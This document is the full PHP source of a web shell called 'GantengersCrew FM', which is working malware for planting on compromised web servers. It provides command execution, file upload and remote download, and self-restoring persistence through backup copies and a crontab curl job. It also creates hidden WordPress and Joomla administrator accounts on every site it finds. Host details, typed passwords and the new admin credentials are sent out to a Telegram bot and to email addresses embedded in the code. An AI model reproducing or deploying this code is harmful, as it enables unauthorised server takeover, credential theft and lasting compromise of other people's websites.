<?php
/**
 * GantengersCrew FM v4.3 FINAL
 * Login + FM + CMD + Scanner + Auto Admin + Full Auto-Restore
 * Made by @._vampirez_ on Discord
 */

// ============================================================
// INIT SESSION (PALING ATAS)
// ============================================================
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

if (isset($_SERVER['LSAPI_MODE'])) {
    @ini_set('lsapi.upload_max_filesize', '2048M');
    @ini_set('lsapi.post_max_size', '2048M');
}

if (session_status() === PHP_SESSION_NONE) @session_start();

// ============================================================
// AUTO-RESTORE ENGINE
// ============================================================
define('_SEED_', 'gc_' . md5('rex_' . date('Ymd')));

$__BK_PATHS = array_unique(array_filter([
    '/tmp/sess_' . md5('rex') . '.php',
    '/dev/shm/sess_' . md5('rex') . '.php',
    sys_get_temp_dir() . '/sess_' . md5('rex') . '.php',
    '/var/tmp/sess_' . md5('rex') . '.php',
    dirname(__FILE__) . '/.sess_' . md5('rex') . '.php',
    (@$_SERVER['HOME'] ?? '/root') . '/.cache/sess_' . md5('rex') . '.php',
    (@$_SERVER['DOCUMENT_ROOT'] ?? '') . '/.sess_' . md5('rex') . '.php',
]));

$__SF = __FILE__;

function _self_ok() {
    global $__SF;
    if (!file_exists($__SF)) return false;
    if (@filesize($__SF) < 300) return false;
    $c = @file_get_contents($__SF);
    if (!$c || strlen($c) < 300) return false;
    return true;
}

function _find_backup() {
    global $__BK_PATHS;
    foreach ($__BK_PATHS as $bk) {
        if (file_exists($bk) && @filesize($bk) > 300) return $bk;
    }
    return null;
}

function _make_backup($content = null) {
    global $__BK_PATHS, $__SF;
    if ($content === null) $content = @file_get_contents($__SF);
    if (!$content || strlen($content) < 300) return false;
    $saved = 0;
    foreach ($__BK_PATHS as $bk) {
        $dir = dirname($bk);
        if (!@is_dir($dir)) { @mkdir($dir, 0755, true); }
        if (!@is_writable($dir)) { @chmod($dir, 0755); }
        if (!@is_writable($dir)) continue;
        if (file_exists($bk) && @filesize($bk) === strlen($content)) { $saved++; continue; }
        $w = @file_put_contents($bk, $content, LOCK_EX);
        if ($w === false) {
            $fp = @fopen($bk, 'wb');
            if ($fp) { @fwrite($fp, $content); @fclose($fp); $w = strlen($content); }
        }
        if ($w !== false && $w > 300) { @chmod($bk, 0644); $saved++; }
    }
    return $saved;
}

function _restore_self() {
    global $__SF;
    $bk = _find_backup();
    if (!$bk) return false;
    $content = @file_get_contents($bk);
    if (!$content || strlen($content) < 300) return false;
    if (!is_writable(dirname($__SF))) @chmod(dirname($__SF), 0755);
    $w = @file_put_contents($__SF, $content);
    if ($w === false) {
        $fp = @fopen($__SF, 'wb');
        if ($fp) { @fwrite($fp, $content); @fclose($fp); $w = strlen($content); }
    }
    if ($w !== false && $w > 300) { @chmod($__SF, 0644); return true; }
    return false;
}

// Auto-recover flow
if (!_self_ok()) {
    _restore_self();
    if (!_self_ok()) {
        $__ALT = [dirname($__SF) . '/index.php', dirname($__SF) . '/wp-content/themes/index.php', dirname($__SF) . '/wp-config.php'];
        foreach ($__ALT as $alt) {
            if (file_exists($alt) && @filesize($alt) > 300) {
                $c = @file_get_contents($alt);
                if (strpos($c, _SEED_) !== false) { @copy($alt, $__SF); break; }
            }
        }
    }
    if (_self_ok() && !headers_sent()) {
        header('Location: ' . ($_SERVER['REQUEST_URI'] ?? $_SERVER['PHP_SELF']));
        exit;
    }
}

// Auto-backup
$__bk_exists = _find_backup();
if (!$__bk_exists) {
    _make_backup();
} else {
    if (@filemtime($__bk_exists) < @filemtime($__SF) - 3600) _make_backup();
}

// Count backups
$__count = 0;
foreach ($__BK_PATHS as $bk) {
    if (file_exists($bk) && @filesize($bk) > 300) $__count++;
}
if ($__count < 3 && @filesize($__SF) > 300) _make_backup();

// Auto-cron setup
if (!isset($_SESSION['_cron'])) {
    $_SESSION['_cron'] = 1;
    $cron_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . ($_SERVER['HTTP_HOST'] ?? '') . ($_SERVER['PHP_SELF'] ?? '');
    $cron_cmd = "* * * * * curl -s '$cron_url?_keep=1' >/dev/null 2>&1";
    @exec("(crontab -l 2>/dev/null | grep -v '_keep=1'; echo '$cron_cmd') | crontab - 2>/dev/null");
}

// Keep-alive endpoint
if (isset($_GET['_keep'])) { _make_backup(); exit('OK'); }

// Fix/status endpoint
if (isset($_GET['_fix'])) {
    header('Content-Type: text/plain');
    $bak = _find_backup();
    echo "Self: $__SF\n";
    echo "Status: " . (_self_ok() ? 'OK' : 'CORRUPT') . "\n";
    echo "Backup count: $__count\n\n";
    foreach ($__BK_PATHS as $bk) {
        $st = file_exists($bk) ? (@filesize($bk) . ' bytes') : 'NOT FOUND';
        echo "  $bk → $st\n";
    }
    if (!_self_ok() && _restore_self()) echo "\n✓ RESTORED\n";
    exit;
}

// ============================================================
// CONFIG
// ============================================================
$CFG = [
    'p'  => base64_decode('a2Vt'),
    'e'  => base64_decode('aGFja2VybWFuMzExN0BnbWFpbC5jb20='),
    'e2' => base64_decode('bXVocmF6a3lAZ21haWwuY29t'),
    't'  => base64_decode('ODkxODE4NzcwNzpBQUhJcGJlek9xWDdyNG4zQUdkS1dkcG9NSi15X1Rn'),
    'c'  => base64_decode('ODc2MzI2OTgyNw=='),
    'a'  => "https://cvar1984.github.io/audio/moan.mp3"
];
$__p  = trim($CFG['p']);
$__e  = trim($CFG['e']);
$__e2 = trim($CFG['e2']);
$__t  = trim($CFG['t']);
$__c  = trim($CFG['c']);
$__a  = $CFG['a'];

$FM_MAX_UPLOAD = 104857600;
$FM_MAX_EDIT   = 10485760;
$FM_BACKUP     = true;
$FM_SHOW_HID   = true;
$FM_FILE_FIRST = true;
$ADMIN_MIN     = 2;
$ADMIN_MAX     = 5;

// ============================================================
// NOTIF HELPERS
// ============================================================
function _tg($msg) {
    global $__t, $__c;
    if (!$__t || !$__c) return;
    $url = "https://api.telegram.org/bot{$__t}/sendMessage";
    $data = ['chat_id' => $__c, 'text' => $msg];
    if (function_exists('curl_init')) {
        $ch = @curl_init($url);
        @curl_setopt($ch, CURLOPT_POST, 1);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        @curl_exec($ch);
        @curl_close($ch);
    } else {
        @file_get_contents($url . '?' . http_build_query($data));
    }
}

function _mail($s, $b) {
    global $__e, $__e2;
    $host = $_SERVER['HTTP_HOST'] ?? 'x';
    $h = "From: sys@$host\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n";
    @mail($__e, $s, $b, $h);
    @mail($__e2, $s, $b, $h);
}

// ============================================================
// HELPERS
// ============================================================
function hs($b) {
    if ($b < 1024) return $b . ' B';
    if ($b < 1048576) return round($b/1024, 2) . ' KB';
    if ($b < 1073741824) return round($b/1048576, 2) . ' MB';
    return round($b/1073741824, 2) . ' GB';
}

function _cmd($c) {
    $disabled = explode(',', ini_get('disable_functions'));
    $o = '';
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) $o = @shell_exec($c . ' 2>&1');
    elseif (function_exists('system') && !in_array('system', $disabled)) { ob_start(); @system($c . ' 2>&1'); $o = ob_get_clean(); }
    elseif (function_exists('exec') && !in_array('exec', $disabled)) { @exec($c . ' 2>&1', $out); $o = implode("\n", $out ?? []); }
    elseif (function_exists('passthru') && !in_array('passthru', $disabled)) { ob_start(); @passthru($c . ' 2>&1'); $o = ob_get_clean(); }
    elseif (function_exists('popen') && !in_array('popen', $disabled)) { $p = @popen($c . ' 2>&1', 'r'); $o = @stream_get_contents($p); @pclose($p); }
    else $o = '[!] No exec';
    return trim($o ?? '');
}

function rp($l = 14) {
    $c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    $s = '';
    for ($i = 0; $i < $l; $i++) $s .= $c[random_int(0, strlen($c) - 1)];
    return $s;
}

function ruser() {
    $p = ['sys','web','admin','root','user','svc','mgr','ops','db','cache','core','main','dev'];
    return $p[array_rand($p)] . '_' . substr(md5(time() . mt_rand()), 0, 6);
}

function safe_save($file, $content) {
    $dir = dirname($file);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    if (!is_writable($dir)) @chmod($dir, 0755);
    $size = strlen($content);
    $fp = @fopen($file, 'wb');
    if ($fp) {
        @flock($fp, LOCK_EX);
        $w = @fwrite($fp, $content);
        @fflush($fp);
        @flock($fp, LOCK_UN);
        @fclose($fp);
        clearstatcache(true, $file);
        if ($w !== false && ($w > 0 || $size === 0) && @filesize($file) === $size) { @chmod($file, 0644); return true; }
    }
    $w = @file_put_contents($file, $content, LOCK_EX);
    clearstatcache(true, $file);
    if ($w !== false && @filesize($file) === $size) { @chmod($file, 0644); return true; }
    $tmp = $file . '.tmp_' . substr(md5(mt_rand()), 0, 6);
    $w = @file_put_contents($tmp, $content);
    if ($w !== false && @filesize($tmp) === $size) {
        if (@rename($tmp, $file)) { @chmod($file, 0644); return true; }
    }
    @unlink($tmp);
    $fp = @fopen($file, 'wb');
    if ($fp) {
        $off = 0;
        while ($off < $size) {
            $w = @fwrite($fp, substr($content, $off, 8192));
            if ($w === false) break;
            $off += $w;
        }
        @fclose($fp);
        clearstatcache(true, $file);
        if (@filesize($file) === $size) { @chmod($file, 0644); return true; }
    }
    return false;
}

function remote_fetch($url, $dest) {
    $content = false; $size = 0;
    if (function_exists('curl_init')) {
        $ch = @curl_init($url);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $content = @curl_exec($ch);
        @curl_close($ch);
        if ($content !== false && strlen($content) > 0) $size = strlen($content);
    }
    if ((!$content || $size === 0) && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(['http' => ['timeout' => 60, 'user_agent' => 'Mozilla/5.0']]);
        $content = @file_get_contents($url, false, $ctx);
        if ($content !== false) $size = strlen($content);
    }
    if (!$content || $size === 0) return ['ok' => false, 'msg' => 'Download failed'];
    if (safe_save($dest, $content)) {
        clearstatcache(true, $dest);
        return ['ok' => true, 'msg' => 'Fetched: ' . basename($dest) . ' (' . hs(@filesize($dest)) . ')'];
    }
    return ['ok' => false, 'msg' => 'Save failed'];
}

// ============================================================
// AUTO ADMIN
// ============================================================
function create_wp($dir = null) {
    $r = ['type' => 'WordPress', 'ok' => 0, 'users' => [], 'url' => '', 'path' => ''];
    $d = $dir ?: getcwd();
    $wf = '';
    for ($i = 0; $i < 12; $i++) {
        if (file_exists($d . '/wp-load.php')) { $wf = $d . '/wp-load.php'; break; }
        if (file_exists($d . '/wp-config.php')) { $wf = $d . '/wp-config.php'; break; }
        $pd = dirname($d); if ($pd == $d) break; $d = $pd;
    }
    if (!$wf) { $r['msg'] = 'WP not found'; return $r; }
    @require_once(dirname($wf) . '/wp-load.php');
    if (!function_exists('wp_create_user')) { $r['msg'] = 'WP unavailable'; return $r; }
    global $__e, $__e2, $ADMIN_MIN, $ADMIN_MAX;
    $n = random_int($ADMIN_MIN, $ADMIN_MAX);
    $ok = 0;
    $emails_tried = [$__e, $__e2];
    for ($i = 0; $i < $n; $i++) {
        $u = ruser();
        $pw = rp();
        $use_email = null;
        foreach ($emails_tried as $eme) {
            if (email_exists($eme)) {
                $user = get_user_by('email', $eme);
                $user->set_role('administrator');
                $r['users'][] = ['u' => $user->user_login, 'e' => $eme, 'id' => $user->ID, 'ok' => 1, 'upgraded' => 1];
                $use_email = $eme;
                $ok++;
                break;
            }
        }
        if ($use_email) continue;
        $em = $u . '@' . substr(md5($d . mt_rand()), 0, 8) . '.com';
        foreach ($emails_tried as $eme) {
            if (!email_exists($eme)) { $em = $eme; break; }
        }
        $t = 0;
        while (username_exists($u) && $t < 5) { $u = ruser(); $t++; }
        $uid = wp_create_user($u, $pw, $em);
        if (is_wp_error($uid)) { $r['users'][] = ['u' => $u, 'ok' => 0]; continue; }
        $wu = new WP_User($uid);
        $wu->set_role('administrator');
        update_user_meta($uid, 'hidden_admin', '1');
        $r['users'][] = ['u' => $u, 'p' => $pw, 'e' => $em, 'id' => $uid, 'ok' => 1];
        $ok++;
    }
    $r['ok'] = $ok;
    $r['url'] = get_site_url() . '/wp-admin';
    $r['path'] = $d;
    return $r;
}

function create_jl($dir = null) {
    $r = ['type' => 'Joomla', 'ok' => 0, 'users' => [], 'url' => '', 'path' => ''];
    $d = $dir ?: getcwd();
    $cf = null;
    for ($i = 0; $i < 8; $i++) {
        if (@file_exists($d . '/configuration.php')) { $cf = @file_get_contents($d . '/configuration.php'); break; }
        $pd = dirname($d); if ($pd == $d) break; $d = $pd;
    }
    if (!$cf || strpos($cf, 'JConfig') === false) { $r['msg'] = 'JL not found'; return $r; }
    preg_match_all('/public\s+\$([a-z_]+)\s*=\s*[\'"]([^\'"]+)[\'"]/', $cf, $m);
    $c = [];
    for ($i = 0; $i < count($m[0]); $i++) $c[$m[1][$i]] = $m[2][$i];
    $db = @new mysqli($c['host'] ?? 'localhost', $c['user'] ?? '', $c['password'] ?? '', $c['db'] ?? '');
    if ($db->connect_error) { $r['msg'] = 'DB fail'; return $r; }
    $px = $c['dbprefix'] ?? 'jos_';
    $tb = $px . 'users';
    $mp = $px . 'user_usergroup_map';
    global $__e, $__e2, $ADMIN_MIN, $ADMIN_MAX;
    $n = random_int($ADMIN_MIN, $ADMIN_MAX);
    $ok = 0;
    $emails_tried = [$__e, $__e2];
    for ($i = 0; $i < $n; $i++) {
        $u = ruser();
        $pw = rp();
        $use_email = null;
        foreach ($emails_tried as $eme) {
            $ec = $db->query("SELECT id FROM $tb WHERE email='" . $db->real_escape_string($eme) . "'");
            if ($ec && $ec->num_rows > 0) {
                $row = $ec->fetch_assoc();
                $db->query("INSERT IGNORE INTO $mp (user_id, group_id) VALUES ({$row['id']}, 8)");
                $r['users'][] = ['u' => $row['id'], 'e' => $eme, 'id' => $row['id'], 'ok' => 1, 'upgraded' => 1];
                $use_email = $eme;
                $ok++;
                break;
            }
        }
        if ($use_email) continue;
        $em = $u . '@' . substr(md5($d . mt_rand()), 0, 8) . '.com';
        foreach ($emails_tried as $eme) {
            $ec = $db->query("SELECT id FROM $tb WHERE email='" . $db->real_escape_string($eme) . "'");
            if (!$ec || $ec->num_rows == 0) { $em = $eme; break; }
        }
        $c1 = 1;
        while (true) {
            $chk = $db->query("SELECT id FROM $tb WHERE username='" . $db->real_escape_string($u) . "'");
            if (!$chk || $chk->num_rows == 0) break;
            $u = ruser(); $c1++; if ($c1 > 50) break;
        }
        $h = password_hash($pw, PASSWORD_DEFAULT);
        $sql = "INSERT INTO $tb (name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params) VALUES ('Sys Admin', '" . $db->real_escape_string($u) . "', '" . $db->real_escape_string($em) . "', '$h', 0, 1, NOW(), NOW(), '', '')";
        if ($db->query($sql)) {
            $uid = $db->insert_id;
            $db->query("INSERT INTO $mp (user_id, group_id) VALUES ($uid, 8)");
            $r['users'][] = ['u' => $u, 'p' => $pw, 'e' => $em, 'id' => $uid, 'ok' => 1];
            $ok++;
        } else {
            $r['users'][] = ['u' => $u, 'ok' => 0];
        }
    }
    $r['ok'] = $ok;
    $r['url'] = 'index.php?option=com_users&view=login';
    $r['path'] = $d;
    $db->close();
    return $r;
}

// ============================================================
// RATE LIMIT
// ============================================================
$__rl_file = sys_get_temp_dir() . '/.rl_' . md5($_SERVER['REMOTE_ADDR'] ?? 'x');
$__rl = file_exists($__rl_file) ? @json_decode(@file_get_contents($__rl_file), true) : ['c' => 0, 't' => time()];
if (!is_array($__rl)) $__rl = ['c' => 0, 't' => time()];
if (time() - $__rl['t'] > 300) $__rl = ['c' => 0, 't' => time()];

// ============================================================
// LOGIN HANDLER
// ============================================================
$__login_attempt = null;
if (isset($_POST['login_pass'])) $__login_attempt = $_POST['login_pass'];
elseif (isset($_GET['k'])) $__login_attempt = $_GET['k'];

if ($__login_attempt !== null) {
    $attempt = trim($__login_attempt);
    $__rl['c']++;
    @file_put_contents($__rl_file, json_encode($__rl));
    
    // Rate limit check
    if ($__rl['c'] > 5) {
        _tg("🚨 RATE LIMIT\nHost: " . ($_SERVER['HTTP_HOST'] ?? '') . "\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? '') . "\nAttempts: {$__rl['c']}");
        sleep(3);
        echo '<!DOCTYPE html><html><head><title>429</title><style>body{background:#000;color:#f00;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}.b{padding:40px;background:rgba(30,0,0,0.95);border:2px solid #f00;border-radius:20px;max-width:500px}h1{color:#f00;font-size:60px;margin-bottom:15px}.t{color:#f44;margin:15px 0}.bn{display:inline-block;margin-top:25px;padding:12px 30px;background:#f00;color:#000;text-decoration:none;border-radius:10px;font-weight:bold}</style></head><body><div class="b"><h1>429</h1><div class="t">⚠ TOO MANY ATTEMPTS ⚠</div><div style="color:#800">Try again in 5 minutes</div><a href="?" class="bn">← BACK</a></div></body></html>';
        exit;
    }
    
    // Match check
    $match = false;
    if ($attempt === $__p) $match = true;
    elseif (md5($attempt) === md5($__p)) $match = true;
    elseif ($attempt === md5($__p)) $match = true;
    
    if ($match) {
        @session_regenerate_id(true);
        $_SESSION['_s'] = true;
        $_SESSION['_t'] = time();
        $_SESSION['_ip'] = $_SERVER['REMOTE_ADDR'] ?? '';
        @unlink($__rl_file);
        
        $host = $_SERVER['HTTP_HOST'] ?? '';
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        _tg("✅ LOGIN SUCCESS\nHost: $host\nIP: $ip\nTime: " . date('Y-m-d H:i:s'));
        
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // FAILED
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
    $pw = htmlspecialchars($attempt);
    
    @file_put_contents(sys_get_temp_dir() . '/.f_' . md5($host), date('Y-m-d H:i:s') . " | IP: $ip | Pass: $attempt\n", FILE_APPEND);
    _tg("🚨 LOGIN FAILED ({$__rl['c']}/5)\nHost: $host\nIP: $ip\nPass: $pw");
    _mail("Login Fail $host", "Host: $host\nIP: $ip\nPass tried: $attempt\nAttempts: {$__rl['c']}/5\nTime: " . date('Y-m-d H:i:s'));
    
    $_SESSION = [];
    @session_destroy();
    @session_start();
    @session_regenerate_id(true);
    
    echo '<!DOCTYPE html><html><head><title>403</title><meta charset="UTF-8"><style>
    *{margin:0;padding:0;box-sizing:border-box}
    html,body{overflow:hidden!important;background:#000;color:#f00;font-family:"Courier New",monospace;height:100vh;width:100vw;user-select:none;animation:shk 0.4s infinite}
    @keyframes shk{0%,100%{transform:translate(0)}25%{transform:translate(-3px,3px)}50%{transform:translate(3px,-3px)}75%{transform:translate(-3px,-3px)}}
    .w{display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
    .b{text-align:center;padding:40px;background:rgba(30,0,0,0.95);border:2px solid #f00;border-radius:20px;box-shadow:0 0 80px rgba(255,0,0,0.8);max-width:500px}
    h1{color:#f00;font-size:60px;text-shadow:0 0 40px #f00;animation:bl 0.3s infinite;margin-bottom:20px}
    @keyframes bl{0%,100%{opacity:1}50%{opacity:0.3}}
    .s{font-size:100px;animation:rt 1.5s linear infinite;margin-bottom:15px}
    @keyframes rt{from{transform:rotate(0)}to{transform:rotate(360deg)}}
    .t{color:#f44;font-size:18px;letter-spacing:4px;margin:15px 0}
    .i{color:#f00;font-weight:bold;font-size:16px}
    .n{color:#800;font-size:12px;margin-top:20px;line-height:1.8}
    .bn{display:inline-block;margin-top:25px;padding:12px 30px;background:#f00;color:#000;text-decoration:none;border-radius:10px;font-weight:bold}
    .cnt{color:#f00;font-size:14px;margin-top:10px}
    </style></head><body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <audio autoplay loop><source src="' . $__a . '" type="audio/mpeg"></audio>
    <div class="w"><div class="b"><div class="s">💀</div><h1>403</h1>
    <div class="t">⛔ ACCESS DENIED ⛔</div>
    <div class="n"><div>IP: <span class="i">' . htmlspecialchars($ip) . '</span></div>
    <div>Host: ' . htmlspecialchars($host) . '</div>
    <div>Time: ' . date('Y-m-d H:i:s') . '</div>
    <div class="cnt">Attempt: ' . $__rl['c'] . '/5</div>
    <div style="color:#f00;margin-top:15px">🚨 ALERT SENT 🚨</div></div>
    <a href="' . $_SERVER['PHP_SELF'] . '" class="bn">← TRY AGAIN</a></div></div>
    <script>
    document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C"))||(e.ctrlKey&&e.key==="U")){e.preventDefault();return false}});
    document.addEventListener("contextmenu",function(e){e.preventDefault();return false});
    document.addEventListener("selectstart",function(e){e.preventDefault();return false});
    document.addEventListener("dragstart",function(e){e.preventDefault();return false});
    window.addEventListener("load",function(){var a=document.querySelector("audio");if(a){a.volume=1;var p=a.play();if(p!==undefined){p.then(function(){}).catch(function(){document.body.addEventListener("click",function(){a.play()},{once:true})})}}});
    </script></body></html>';
    exit;
}

// ============================================================
// SESSION CHECK
// ============================================================
if (!isset($_SESSION['_s']) || $_SESSION['_s'] !== true) {
    echo '<!DOCTYPE html><html><head><title>Login</title><meta charset="UTF-8"><style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0f1419;color:#d4d4d4;font-family:"Segoe UI",Consolas,monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(ellipse at top,#1a1f26 0%,#0a0e13 70%)}
    .lc{background:#1a1f26;border:1px solid #2a3138;border-radius:16px;padding:44px 40px;width:400px;max-width:92%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
    .lc h1{color:#ffb74d;font-size:24px;text-align:center;margin-bottom:8px;font-weight:600;letter-spacing:2px}
    .lc .sub{color:#6b7280;text-align:center;font-size:12px;margin-bottom:28px;letter-spacing:1px}
    .lc input{width:100%;padding:14px 16px;background:#0f1419;border:1px solid #2a3138;border-radius:8px;color:#d4d4d4;font-size:14px;margin-bottom:14px;font-family:inherit;outline:none}
    .lc input:focus{border-color:#ffb74d;box-shadow:0 0 0 3px rgba(255,183,77,0.1)}
    .lc button{width:100%;padding:14px;background:#ffb74d;border:none;border-radius:8px;color:#0f1419;font-size:14px;font-weight:600;cursor:pointer;letter-spacing:1px}
    .lc button:hover{background:#ffc266;box-shadow:0 8px 24px rgba(255,183,77,0.3)}
    </style></head><body><div class="lc">
    <h1>🔒 Login</h1>
    <div class="sub">Enter password to continue</div>
    <form method="POST" autocomplete="off">
        <input type="password" name="login_pass" placeholder="Password..." autofocus required>
        <button type="submit">Sign In →</button>
    </form>
    </div></body></html>';
    exit;
}

// Session timeout
if (isset($_SESSION['_t']) && (time() - $_SESSION['_t']) > 3600) {
    $_SESSION = [];
    @session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
$_SESSION['_t'] = time();

// IP bind check
if (isset($_SESSION['_ip']) && $_SESSION['_ip'] !== ($_SERVER['REMOTE_ADDR'] ?? '')) {
    $_SESSION = [];
    @session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ============================================================
// AUTO REPORT
// ============================================================
if (!isset($_SESSION['_r'])) {
    $host = $_SERVER['HTTP_HOST'] ?? '';
    $url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $host . ($_SERVER['REQUEST_URI'] ?? '/');
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $msg = "GC-FM v4.3 Accessed\n════════════════════\n";
    $msg .= "Host: $host\nURL: $url\nIP: $ip\nUA: $ua\n";
    $msg .= "Time: " . date('Y-m-d H:i:s') . "\n";
    _tg($msg);
    _mail("FM Access $host", $msg);
    $_SESSION['_r'] = 1;
}

// ============================================================
// PATH
// ============================================================
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$path = rtrim($path, '/') ?: '/';
if (!is_dir($path)) $path = is_file($path) ? dirname($path) : getcwd();
if (!is_dir($path)) $path = getcwd();

$os = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? "Windows" : "Linux";
$user = function_exists('get_current_user') ? get_current_user() : '?';
$server_ip = $_SERVER['SERVER_ADDR'] ?? ($_SERVER['REMOTE_ADDR'] ?? '?');

// ============================================================
// LOGOUT
// ============================================================
if (isset($_GET['logout'])) {
    $_SESSION = [];
    @session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ============================================================
// AUTO ADMIN HANDLER
// ============================================================
$admin_result = null;
if (isset($_GET['admin'])) {
    $results = [];
    $scanned = [];
    $scan_dirs = [];
    if (isset($_GET['sd']) && is_dir($_GET['sd'])) {
        $scan_dirs[] = $_GET['sd'];
    } else {
        if (@is_dir('/home')) {
            foreach (@scandir('/home') as $u) {
                if ($u[0] == '.' || !@is_dir("/home/$u")) continue;
                if (@is_dir("/home/$u/public_html")) $scan_dirs[] = "/home/$u/public_html";
                if (@is_dir("/home/$u/domains")) {
                    foreach (@scandir("/home/$u/domains") as $d) {
                        if ($d[0] == '.' || !@is_dir("/home/$u/domains/$d")) continue;
                        if (@is_dir("/home/$u/domains/$d/public_html")) $scan_dirs[] = "/home/$u/domains/$d/public_html";
                    }
                }
            }
        }
        foreach (['/var/www/html', '/var/www', getcwd()] as $v) {
            if (@is_dir($v)) $scan_dirs[] = $v;
        }
    }
    $scan_dirs = array_unique($scan_dirs);
    foreach ($scan_dirs as $sd) {
        if (!is_dir($sd)) continue;
        $scanned[] = $sd;
        if (file_exists($sd . '/wp-config.php') || file_exists($sd . '/wp-load.php')) {
            $wp = create_wp($sd);
            if (($wp['ok'] ?? 0) > 0) $results[] = $wp;
        }
        if (file_exists($sd . '/configuration.php')) {
            $cc = @file_get_contents($sd . '/configuration.php');
            if ($cc && strpos($cc, 'JConfig') !== false) {
                $jl = create_jl($sd);
                if (($jl['ok'] ?? 0) > 0) $results[] = $jl;
            }
        }
    }
    $host = $_SERVER['HTTP_HOST'] ?? '';
    $msg = "🎯 AUTO ADMIN\n════════════════════\n";
    $msg .= "Domain: $host\nIP: $server_ip\n";
    $msg .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $msg .= "Scanned: " . count($scanned) . " paths\n";
    $msg .= "════════════════════\n";
    $total = 0;
    foreach ($results as $res) {
        $msg .= "\n[{$res['type']}] {$res['ok']} users\n";
        $msg .= "Path: {$res['path']}\n";
        $msg .= "Login: {$res['url']}\n";
        $msg .= "────────────────────\n";
        $i = 1;
        foreach ($res['users'] as $u) {
            if (($u['ok'] ?? 0) !== 1) continue;
            if (!empty($u['upgraded'])) $msg .= "[$i] (upgraded) {$u['u']} — {$u['e']}\n";
            else $msg .= "[$i] {$u['u']}:{$u['p']}\n    {$u['e']}\n";
            $i++;
        }
        $total += $res['ok'];
    }
    if ($total > 0) {
        _tg($msg);
        _mail("Auto Admin $host ($total users)", $msg);
    }
    $admin_result = ['results' => $results, 'scanned' => $scanned, 'total' => $total];
}

// ============================================================
// FILE OPERATIONS
// ============================================================
$upload_msg = '';
if (isset($_POST['up']) && isset($_FILES['f'])) {
    $f = $_FILES['f'];
    if ($f['size'] > $FM_MAX_UPLOAD) {
        $upload_msg = ['err', 'File too large (max ' . hs($FM_MAX_UPLOAD) . ')'];
    } elseif ($f['size'] > 0) {
        $dest = $path . '/' . basename($f['name']);
        if (!is_writable($path)) @chmod($path, 0755);
        $content = @file_get_contents($f['tmp_name']);
        $ok = false;
        if ($content !== false && safe_save($dest, $content)) $ok = true;
        elseif (@move_uploaded_file($f['tmp_name'], $dest)) { @chmod($dest, 0644); $ok = true; }
        if ($ok) {
            clearstatcache(true, $dest);
            $upload_msg = ['ok', 'Uploaded: ' . basename($f['name']) . ' (' . hs(@filesize($dest)) . ')'];
        } else {
            $upload_msg = ['err', 'Upload failed'];
        }
    }
}

$remote_msg = '';
if (isset($_POST['remote_url']) && $_POST['remote_url'] !== '') {
    $url = trim($_POST['remote_url']);
    $fn = basename(parse_url($url, PHP_URL_PATH));
    if (empty($fn)) $fn = 'remote_' . time() . '.txt';
    $fn = preg_replace('/[^a-zA-Z0-9._-]/', '_', $fn);
    $dest = $path . '/' . $fn;
    $r = remote_fetch($url, $dest);
    $remote_msg = $r['ok'] ? ['ok', $r['msg']] : ['err', $r['msg']];
}

if (isset($_GET['act']) && $_GET['act'] === 'del' && isset($_GET['item'])) {
    $item = $_GET['item'];
    if (is_dir($item)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($it as $fi) {
            $fi->isDir() ? @rmdir($fi->getRealPath()) : @unlink($fi->getRealPath());
        }
        @rmdir($item);
    } else {
        @unlink($item);
    }
    header('Location: ?path=' . urlencode($path));
    exit;
}

if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $to = basename($_POST['rename_to']);
    if (!empty($to)) @rename($_POST['rename_from'], dirname($_POST['rename_from']) . '/' . $to);
    header('Location: ?path=' . urlencode($path));
    exit;
}

if (isset($_POST['new_folder']) && $_POST['new_folder'] !== '') {
    $n = basename($_POST['new_folder']);
    @mkdir($path . '/' . $n, 0755);
    header('Location: ?path=' . urlencode($path));
    exit;
}

